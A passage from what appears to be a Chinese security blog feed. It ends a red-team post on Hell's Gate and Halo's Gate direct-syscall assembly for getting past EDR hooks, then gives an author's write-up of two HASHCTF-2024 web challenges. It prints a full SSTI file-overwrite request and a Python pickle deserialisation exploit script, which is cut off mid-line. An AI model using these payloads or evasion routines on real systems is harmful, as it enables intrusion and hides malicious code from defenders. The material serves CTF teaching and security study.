wSystemCall, 000h</span><br><span class="line">mov wSystemCall, ecx</span><br><span class="line">ret</span><br><span class="line">HellsGate ENDP</span><br><span class="line"></span><br><span class="line">HellDescent PROC; 系统调用，可以参考ntdll.dll中的反汇编代码</span><br><span class="line">mov r10, rcx</span><br><span class="line">mov eax, wSystemCall</span><br><span class="line"></span><br><span class="line">syscall</span><br><span class="line">ret</span><br><span class="line">HellDescent ENDP</span><br><span class="line">end</span><br></pre></td></tr></table></figure><h2 id="HalosGate"><a href="#HalosGate" class="headerlink" title="HalosGate"></a>HalosGate</h2><p>HellsGate的缺点是它定位API时需要一个没有经过任何hook的ntdll.dll，因为获取API时的偏移都是硬编码的</p><p>倘如ntdll.dll被hook时，那么HalosGate就失效了，为了解决这个问题，HalosGate应运而生</p><p>光环之门的基本原理就是找到未被hook的系统调用，根据系统调用号的临近关系进行推测</p><p>重点看下findSyscallNumber、halosGateUp、halosGateDown这几个函数</p><ul><li>findSyscallNumber</li></ul><p>在jne error处检查是否被hook，如果没有则返回syscall号，源代码中不启用光环之门，而是继续地狱之门</p><p><code>cmp edi, [rcx]</code>：检查是否被hook如果有则返回error，启用光环之门</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">findSyscallNumber PROC</span><br><span class="line">xor rsi, rsi</span><br><span class="line">xor rdi, rdi </span><br><span class="line">mov rsi, 00B8D18B4Ch   ; bytes at start of NTDLL stub to setup syscall in RAX</span><br><span class="line">mov edi, [rcx]         ; RDI = first 4 bytes of NTDLL API syscall stub (mov r10,rcx;mov eax,&lt;syscall#&gt;)</span><br><span class="line">cmp rsi, rdi</span><br><span class="line">jne error              ; if the bytes dont match then its prob hooked. Exit gracefully</span><br><span class="line">xor rax,rax            ; clear RAX as it will hold the syscall</span><br><span class="line">mov ax, [rcx+4]        ; The systemcall number</span><br><span class="line">ret                    ; return to caller</span><br><span class="line">findSyscallNumber ENDP</span><br></pre></td></tr></table></figure><ul><li>halosGateUp：向上获取SSN</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">halosGateUp PROC</span><br><span class="line">xor rsi, rsi</span><br><span class="line">xor rdi, rdi </span><br><span class="line">mov rsi, 00B8D18B4Ch   ; bytes at start of NTDLL stub to setup syscall in RAX</span><br><span class="line">xor rax, rax</span><br><span class="line">mov al, 20h            ; 32 * Increment = Syscall Up</span><br><span class="line">mul dx                 ; RAX = RAX * RDX = 32 * Syscall Up</span><br><span class="line">add rcx, rax           ; RCX = NTDLL.API +- Syscall Stub</span><br><span class="line">mov edi, [rcx]         ; RDI = first 4 bytes of NTDLL API syscall stub, incremented Up by HalosGate (mov r10, rcx; mov eax, &lt;syscall#&gt;)</span><br><span class="line">cmp rsi, rdi</span><br><span class="line">jne error              ; if the bytes dont match then its prob hooked. Exit gracefully</span><br><span class="line">xor rax,rax            ; clear RAX as it will hold the syscall</span><br><span class="line">mov ax, [rcx+4]        ; The systemcall number for the API close to the target</span><br><span class="line">ret                    ; return to caller</span><br><span class="line">halosGateUp ENDP</span><br></pre></td></tr></table></figure><ul><li>halosGateDown：向下获取SSN</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">halosGateDown PROC</span><br><span class="line">xor rsi, rsi</span><br><span class="line">xor rdi, rdi </span><br><span class="line">mov rsi, 00B8D18B4Ch   ; bytes at start of NTDLL stub to setup syscall in RAX</span><br><span class="line">xor rax, rax</span><br><span class="line">mov al, 20h            ; 32 * Increment = Syscall Down</span><br><span class="line">mul dx                 ; RAX = RAX * RDX = 32 * Syscall Down</span><br><span class="line">sub rcx, rax           ; RCX = NTDLL.API - Syscall Stub</span><br><span class="line">mov edi, [rcx]         ; RDI = first 4 bytes of NTDLL API syscall stub, incremented Down by HalosGate (mov r10, rcx; mov eax, &lt;syscall#&gt;)</span><br><span class="line">cmp rsi, rdi</span><br><span class="line">jne error              ; if the bytes dont match then its prob hooked. Exit gracefully</span><br><span class="line">xor rax,rax            ; clear RAX as it will hold the syscall</span><br><span class="line">mov ax, [rcx+4]        ; The systemcall number for the API close to the target</span><br><span class="line">ret                    ; return to caller</span><br><span class="line">halosGateDown ENDP</span><br></pre></td></tr></table></figure><h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ol><li><p><a href="https://blog.eonew.cn/2018-09-09.%E5%AE%9A%E4%BD%8DAPI%E7%9A%84%E5%8E%9F%E7%90%86.html">https://blog.eonew.cn/2018-09-09.%E5%AE%9A%E4%BD%8DAPI%E7%9A%84%E5%8E%9F%E7%90%86.html</a></p></li><li><p><a href="https://xz.aliyun.com/t/12885?time__1311=mqmhq+xjxGED/7NeBKnOQAnxD56D&alichlgref=https://www.google.com/#toc-17">https://xz.aliyun.com/t/12885?time__1311=mqmhq%2BxjxGED%2F7NeBKnOQAnxD56D&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-17</a></p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PEB等结构&quot;&gt;&lt;a href=&quot;#PEB等结构&quot; class=&quot;headerlink&quot; title=&quot;PEB等结构&quot;&gt;&lt;/a&gt;PEB等结构&lt;/h1&gt;&lt;p&gt;神图&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://icfh-imgs-1313391192.cos.a</summary>
      
    
    
    
    
    <category term="RedTeam" scheme="http://example.com/tags/RedTeam/"/>
    
  </entry>
  
  <entry>
    <title>HASHCTF-2024 出题笔记和心得</title>
    <link href="http://example.com/2024/04/10/SDUCTF/"/>
    <id>http://example.com/2024/04/10/SDUCTF/</id>
    <published>2024-04-10T12:37:43.000Z</published>
    <updated>2024-04-14T14:01:25.763Z</updated>
    
    <content type="html"><![CDATA[<p>很开心以web出题人的身份出现在这次比赛中，学到挺多的</p><p>附件地址：<a href="https://github.com/HongLaiCh3/CTF-Game">https://github.com/HongLaiCh3/CTF-Game</a></p><h2 id="go2RCE"><a href="#go2RCE" class="headerlink" title="go2RCE"></a>go2RCE</h2><p>考点：go SSTI、热部署</p><p>出题人：ch3</p><p>难度：困难</p><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>SSTI的原理就不解释了，懂的都懂，不懂的自己google吧</p><p>SESSION_KEY在给大家的附件中是fake，需要自己通过漏洞泄露</p><p>这里有三个路由<code>/</code>，<code>/welcome</code>，<code>/welcome/username</code>，<code>/admin</code></p><p>然后去看对应的路由文件，Index里设置了session-name的session</p><p>然后welcome要求POST传username和skill</p><p>admin使用了pongo2模板来解析</p><h3 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h3><h4 id="SSTI读取Session-Key"><a href="#SSTI读取Session-Key" class="headerlink" title="SSTI读取Session-Key"></a>SSTI读取Session-Key</h4><p>参考：<a href="https://tyskill.github.io/posts/gossti/">https://tyskill.github.io/posts/gossti/</a></p><p>这个b后端算是写得很刻意了。。</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403281826003.png" alt="image-20240328102028141"></p><p>妥妥模板注入</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403281826769.png" alt="image-20240328102107423"></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403281826931.png" alt="image-20240328102159824"></p><p>泄露session-key后，拿去ascii解码，顺道填入最开始设置SESSION_KEY的环境变量的位置</p><p>接下来就是本地的session伪造了，既然有了session-key，直接本地改下，然后启动服务</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403281826266.png" alt="image-20240327162822609"></p><p>获得admin-session如下：</p><blockquote><p>MTcxMTA2NTkzNXxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXzaXqKrp-8lPsyq0EqYjYDyChtvEVjpT-5vNJCAFJBclw&#x3D;&#x3D;</p></blockquote><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403281826986.png" alt="image-20240328102748286"></p><h4 id="Pongo2-SSTI文件写-热部署特性-实现RCE"><a href="#Pongo2-SSTI文件写-热部署特性-实现RCE" class="headerlink" title="Pongo2 SSTI文件写 + 热部署特性 &#x3D; 实现RCE"></a>Pongo2 SSTI文件写 + 热部署特性 &#x3D; 实现RCE</h4><p>具体的可以查下pongo2 SSTI以及context的相关文档，参考：<a href="https://dummykitty.github.io/go/2023/05/30/Go-pongo-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5.html">https://dummykitty.github.io/go/2023/05/30/Go-pongo-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5.html</a></p><p>poc:</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403281826066.png" alt="image-20240327164048893"></p><p>那么问题来了？可以任意读、任意写，但是不知道flag在哪，不妨想想怎么进一步getshell</p><p>由于我使用的是fresh热部署，当服务文件修改时，会重新编译执行go文件，此处也是RCE的办法</p><p>利用：</p><ul><li>读源码</li></ul><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403281826758.png" alt="image-20240328182356447"></p><ul><li>然后写文件，多写一条RCE的路由（<del>考虑到没有校内vps，不然一般直接反弹shell</del>）</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/admin?name=%7B%25%20include%20c.SaveUploadedFile(c.FormFile(c.Request.Header.Filetype%5B0%5D),c.Request.Header.Filepath%5B0%5D)%20%25%7D</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:3000</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Chromium&quot;;v=&quot;103&quot;, &quot;.Not/A)Brand&quot;;v=&quot;99&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Filetype</span><span class="punctuation">: </span>file</span><br><span class="line"><span class="attribute">Filepath</span><span class="punctuation">: </span>/home/ctfer/app/main.go</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>none</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>csrftoken=q8pYXi0Pe5IGRo6rCTonyIMChfFpovj1; session-name=MTcxMTA2NTkzNXxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXzaXqKrp-8lPsyq0EqYjYDyChtvEVjpT-5vNJCAFJBclw==</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=01f54ee8f2872c8a0d42d14f70cdc1fe</span><br><span class="line"></span><br><span class="line"><span class="language-stata">--01f54ee8f2872c8a0d42d14f70cdc1fe</span></span><br><span class="line"><span class="language-stata">Content-Disposition: <span class="keyword">form</span>-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;test.png&quot;</span></span></span><br><span class="line"><span class="language-stata">Content-<span class="keyword">Type</span>: image/png</span></span><br><span class="line"><span class="language-stata"></span></span><br><span class="line"><span class="language-stata">package main</span></span><br><span class="line"><span class="language-stata"></span></span><br><span class="line"><span class="language-stata">import (</span></span><br><span class="line"><span class="language-stata"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span></span><br><span class="line"><span class="language-stata"><span class="string">&quot;main/route&quot;</span></span></span><br><span class="line"><span class="language-stata"><span class="string">&quot;os&quot;</span></span></span><br><span class="line"><span class="language-stata"><span class="string">&quot;os/exec&quot;</span></span></span><br><span class="line"><span class="language-stata">)</span></span><br><span class="line"><span class="language-stata"></span></span><br><span class="line"><span class="language-stata">func main() &#123;</span></span><br><span class="line"><span class="language-stata"><span class="comment">//I don&#x27;t tell you the session key, can you find it?</span></span></span><br><span class="line"><span class="language-stata"><span class="comment">//err := os.Setenv(&quot;SESSION_KEY&quot;, &quot;fake_session_key&quot;)</span></span></span><br><span class="line"><span class="language-stata"><span class="keyword">err</span> := os.Unsetenv(<span class="string">&quot;GZCTF_FLAG&quot;</span>)</span></span><br><span class="line"><span class="language-stata"><span class="keyword">if</span> <span class="keyword">err</span> != nil &#123;</span></span><br><span class="line"><span class="language-stata"><span class="keyword">return</span></span></span><br><span class="line"><span class="language-stata">&#125;</span></span><br><span class="line"><span class="language-stata"><span class="keyword">err</span> = os.Setenv(<span class="string">&quot;SESSION_KEY&quot;</span>, <span class="string">&quot;th1s_1s_w3b_g0_ch4l1eng3&quot;</span>)</span></span><br><span class="line"><span class="language-stata"><span class="keyword">if</span> <span class="keyword">err</span> != nil &#123;</span></span><br><span class="line"><span class="language-stata"><span class="keyword">return</span></span></span><br><span class="line"><span class="language-stata">&#125;</span></span><br><span class="line"><span class="language-stata">r := gin.Default()</span></span><br><span class="line"><span class="language-stata">r.<span class="built_in">GET</span>(<span class="string">&quot;/&quot;</span>, route.Index)</span></span><br><span class="line"><span class="language-stata">r.<span class="built_in">GET</span>(<span class="string">&quot;/welcome&quot;</span>, route.Welcome)</span></span><br><span class="line"><span class="language-stata">r.<span class="built_in">GET</span>(<span class="string">&quot;/welcome/:username&quot;</span>, route.Welcome)</span></span><br><span class="line"><span class="language-stata">r.<span class="built_in">GET</span>(<span class="string">&quot;/admin&quot;</span>, route.Admin)</span></span><br><span class="line"><span class="language-stata"></span></span><br><span class="line"><span class="language-stata">r.<span class="built_in">GET</span>(<span class="string">&quot;/getflag&quot;</span>, func(c *gin.Context) &#123;</span></span><br><span class="line"><span class="language-stata">cmd := exec.Command(<span class="string">&quot;ls&quot;</span>)</span></span><br><span class="line"><span class="language-stata"><span class="comment">// cmd := exec.Command(&quot;cat&quot;,&quot;hhhnb_f14g_0h_y0u_g0t_1t_6666666&quot;)</span></span></span><br><span class="line"><span class="language-stata">flag, <span class="keyword">err</span> := cmd.CombinedOutput()</span></span><br><span class="line"><span class="language-stata"><span class="keyword">if</span> <span class="keyword">err</span> != nil &#123;</span></span><br><span class="line"><span class="language-stata">c.<span class="built_in">String</span>(500, <span class="string">&quot;error&quot;</span>)</span></span><br><span class="line"><span class="language-stata">&#125;</span></span><br><span class="line"><span class="language-stata">c.<span class="built_in">String</span>(200, <span class="built_in">string</span>(flag))</span></span><br><span class="line"><span class="language-stata">&#125;)</span></span><br><span class="line"><span class="language-stata"></span></span><br><span class="line"><span class="language-stata"><span class="keyword">err</span> = r.<span class="keyword">Run</span>(<span class="string">&quot;0.0.0.0:80&quot;</span>)</span></span><br><span class="line"><span class="language-stata"><span class="keyword">if</span> <span class="keyword">err</span> != nil &#123;</span></span><br><span class="line"><span class="language-stata"><span class="keyword">return</span></span></span><br><span class="line"><span class="language-stata">&#125;</span></span><br><span class="line"><span class="language-stata">&#125;</span></span><br><span class="line"><span class="language-stata">--01f54ee8f2872c8a0d42d14f70cdc1fe--</span></span><br><span class="line"><span class="language-stata"></span></span><br></pre></td></tr></table></figure><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403281826485.png" alt="image-20240328182539731"></p><p>然后读flag即可</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202403281826703.png" alt="image-20240328182625676"></p><h3 id="我的出题踩坑点"><a href="#我的出题踩坑点" class="headerlink" title="我的出题踩坑点"></a>我的出题踩坑点</h3><ul><li>由于GZCTF平台的缘故，我原本使用gin来热部署，但是在docker端口暴露上出现了问题（因为gin需要额外的hot-deploy-proxy-port），后面换用了fresh</li><li>也是平台的缘故，改用shell脚本启动服务，这里也是删去环境变量防止非预期的手法</li></ul><h2 id="蟒蛇宝宝"><a href="#蟒蛇宝宝" class="headerlink" title="蟒蛇宝宝"></a>蟒蛇宝宝</h2><p>考点：python原型链污染，pickle反序列化</p><p>出题人：ch3</p><p>难度：困难</p><h3 id="python原型链污染"><a href="#python原型链污染" class="headerlink" title="python原型链污染"></a>python原型链污染</h3><p>原理请参考ttt社区：<a href="https://tttang.com/archive/1876/">https://tttang.com/archive/1876/</a></p><p>可以调试一下merge函数，在<code>__init__.__globals__</code>下可以获得<code>admin</code>对象</p><p>那么可以污染到变量信息，我们可以修改admin的密码</p><pre><code>payload = &#123;    &quot;username&quot;: new_username,    &quot;password&quot;: new_password,    &quot;__init__&quot;: &#123;        &quot;__globals__&quot;: &#123;            &quot;admin&quot;: &#123;                &quot;password&quot;: admin_password            &#125;        &#125;    &#125;&#125;</code></pre><h3 id="pickle反序列化"><a href="#pickle反序列化" class="headerlink" title="pickle反序列化"></a>pickle反序列化</h3><p>漏洞利用点在Show函数中的pickle.loads，这是一个很危险的地方</p><p>而且pickle反序列化的前提时我们能够重写类，所以红框上一行的loads就用不了了</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404111746961.png" alt="image-20240411174112111"></p><p><del>由于学校防火墙以及网络配置等问题，反弹shell操作基本不可能，再说大多数同学应该没有vps吧</del></p><p>所以RCE的结果怎么给外带呢？</p><p>注意到有个static文件夹，这里的文件是可读可下载的，那么我们在<code>__reduce__</code>里可以将flag写入到static中的文件，然后下载即可获得flag</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404111746405.png" alt="image-20240411174515840"></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202404111746037.png" alt="image-20240411174639676"></p><h3 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># the attack url</span></span><br><span class="line">baseURL = <span class="string">&quot;http://127.0.0.1:40825&quot;</span></span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># rewrite the user class</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Message</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, _message, _status</span>):</span><br><span class="line">        self.message = _message</span><br><span class="line">        self.status = _status</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.system, (<span class="string">&#x27;cat /flag &gt; /app/static/img.png&#x27;</span>,))</span><br><span class="line"></span><br><span class="line"><span class="comment"># register</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AdminPasswordPollute</span>(<span class="params">admin_password, new_username, new_password</span>):</span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: new_username,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: new_password,</span><br><span class="line">        <span class="string">&quot;__init__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;__globals__&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;admin&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;password&quot;</span>: admin_password</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    registerURL = <span class="string">&quot;/register&quot;</span></span><br><span class="line">    req = s.post(url=baseURL + registerURL, json=payload)</span><br><span class="line">    <span class="comment"># time.sleep(1)</span></span><br><span class="line">    <span class="keyword">if</span> req.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+]register attack success, you can login as admin by the password: <span class="subst">&#123;admin_password&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-]attack error when registering&quot;</span>)</span><br><span class="line">        exit(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># login</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">LoginAndPickleAttack</span>(<span class="params">admin_password, new_username, new_password</span>):</span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: admin_password</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># login as admin</span></span><br><span class="line">    loginURL = <span class="string">&quot;/login&quot;</span></span><br><span class="line">    req = s.post(url=baseURL + loginURL, json=payload)</span><br><span class="line">    <span class="comment"># time.sleep(1)</span></span><br><span class="line">    <span class="keyword">if</span> req.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+]Now login as admin&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-]fail to login as admin&quot;</span>)</span><br><span class="line">        exit(-<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    badmsg = Message(<span class="string">&quot;attack&quot;</span>, <span class="string">&quot;good&quot;</span>)</span><br><span class="line">    badmsgbytes = pickle.dumps(badmsg, protocol=<span class="number">4</span>)</span><br><span class="line">    editURL = <span class="string">&quot;/profile/admin/edit&quot;</span></span><br><span class="line">    payload1 = &#123;</span><br><span class="line">        <span class="string">&quot;message&quot;</span>: base64.b64encode(badmsgbytes).decode(<span class="string">&#x27;utf-8&#x27;</span>),</span><br><span class="line">        <span class="string">&quot;status&quot;</span>: <span class="string">&quot;nice&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    req1 = s.post(url=baseURL + editURL, json=payload1)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> req1.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+]upload the attack payload success&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-]upload the attack payload fail&quot;</span>)</span><br><span class="line">        exit(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># now trigger the python pickle ==&gt; RCE</span></span><br><span class="line">    viewURL = <span class="string">f&quot;/profile/admin/view/api&quot;</span></span><br><span class="line">    req2 = s.get(url=baseURL + viewURL)</span><br><span class="line">    <span class="comment"># time.sleep(1)</span></span><br><span class="line">    <span class="keyword">if</span> req2.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+]RCE Success!&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-]RCE Fail..&quot;</span>)</span><br><span class="line">        exit(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    s.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    os.system(<span 